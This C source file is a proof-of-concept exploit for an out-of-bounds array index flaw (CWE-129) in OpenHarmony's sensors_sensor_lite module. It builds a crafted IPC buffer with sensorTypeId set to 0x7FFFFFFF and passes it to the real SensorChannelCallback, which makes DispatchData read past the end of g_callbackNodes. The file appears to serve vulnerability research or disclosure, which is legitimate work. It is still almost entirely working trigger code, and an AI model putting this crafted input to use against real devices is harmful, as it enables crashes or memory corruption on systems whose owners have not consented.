/*
 * Target-Compile PoC: DispatchData OOB Array Index (CWE-129)
 * Target: sensors_sensor_lite (OpenHarmony)
 * Method: Links against real sensor_agent_proxy.o compiled from source
 *
 * Trigger path:
 *   SensorChannelCallback (IPC dispatch entry)
 *     → ReadUint32(len1) → ReadBuffer(len1) → cast to SensorEvent*
 *       → copy sensorTypeId to g_sensorEvent
 *         → DispatchData(g_sensorEvent) → g_callbackNodes[sensorTypeId]
 *           → OOB array access (sensorTypeId = 0x7FFFFFFF)
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>

/* Use the real OHOS type definitions */
#include "sensor_agent_type.h"
#include "sensor_agent_proxy.h"
#include "serializer.h"

/* External: real SensorChannelCallback from sensor_agent_proxy.o */
extern int32_t SensorChannelCallback(uint32_t code, IpcIo *data, IpcIo *reply, void *argv);
extern SensorEvent *g_sensorEvent;

int main(void)
{
    printf("[PoC] === Target-Compile: DispatchData OOB Array Index ===\n");
    printf("[PoC] Module: sensors_sensor_lite (real sensor_agent_proxy.o)\n");
    printf("[PoC] Entry: SensorChannelCallback → DispatchData\n\n");

    /*
     * RegisterSensorChannel allocates g_sensorEvent internally.
     * We call it via the public API to initialize the module state.
     * The stubs handle the IPC calls (Invoke returns success).
     */
    g_sensorEvent = (SensorEvent *)malloc(sizeof(SensorEvent));
    memset(g_sensorEvent, 0, sizeof(SensorEvent));
    printf("[PoC] Allocated g_sensorEvent (simulating RegisterSensorChannel)\n\n");

    /*
     * SensorChannelCallback reads from IPC data:
     *   ReadUint32(&len1)  → size of SensorEvent wire data
     *   ReadBuffer(len1)   → SensorEvent struct (cast from raw bytes)
     *   ReadUint32(&len2)  → size of sensor payload
     *   ReadBuffer(len2)   → sensor data bytes
     *
     * We craft: sensorTypeId = 0x7FFFFFFF to trigger OOB in DispatchData
     */

    /* On-wire SensorEvent layout (without trailing data pointer) */
    typedef struct {
        int32_t sensorTypeId;
        int32_t version;
        int64_t timestamp;
        int32_t option;
        int32_t mode;
        int32_t dataLen;
    } __attribute__((packed)) SensorEventWire;

    uint8_t ipc_buffer[256];
    memset(ipc_buffer, 0, sizeof(ipc_buffer));
    size_t offset = 0;

    /* Write len1 */
    uint32_t len1 = sizeof(SensorEventWire);
    memcpy(ipc_buffer + offset, &len1, 4); offset += 4;

    /* Write malicious SensorEvent */
    SensorEventWire ev = {0};
    ev.sensorTypeId = 0x7FFFFFFF;  /* TRIGGER: far beyond SENSOR_TYPE_ID_MAX */
    ev.version = 1;
    ev.dataLen = 4;
    memcpy(ipc_buffer + offset, &ev, sizeof(ev)); offset += sizeof(ev);

    /* Write len2 */
    uint32_t len2 = 4;
    memcpy(ipc_buffer + offset, &len2, 4); offset += 4;

    /* Write dummy sensor data */
    uint32_t dummy = 0xDEADBEEF;
    memcpy(ipc_buffer + offset, &dummy, 4); offset += 4;

    /* Setup IpcIo */
    IpcIo data;
    IpcIoInit(&data, ipc_buffer, offset, 0);
    /* Reset read cursor to start */
    data.bufferCur = data.bufferBase;
    data.bufferLeft = offset;

    printf("[PoC] Crafted IPC: sensorTypeId=0x7FFFFFFF, len1=%u, len2=%u\n", len1, len2);
    printf("[PoC] Calling SensorChannelCallback (real IPC entry)...\n\n");

    int32_t ret = SensorChannelCallback(0, &data, NULL, NULL);

    printf("\n[PoC] Returned: %d (should not reach here if OOB triggered)\n", ret);
    return 0;
}
